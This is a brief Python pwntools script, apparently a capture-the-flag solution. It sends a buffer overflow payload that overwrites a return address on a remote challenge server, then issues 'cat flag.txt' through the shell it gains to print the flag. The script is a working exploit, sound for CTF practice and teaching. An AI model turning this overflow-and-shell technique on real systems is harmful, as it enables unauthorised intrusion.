from pwn import *
r = remote("backdoor.heltsikker.no", 9002)
r.sendline(fit({cyclic_find(0x6161616c) : p32(0x08049236)}))
r.sendline("cat flag.txt")
print(r.recvline_startswith("HSCTF").decode("UTF-8"))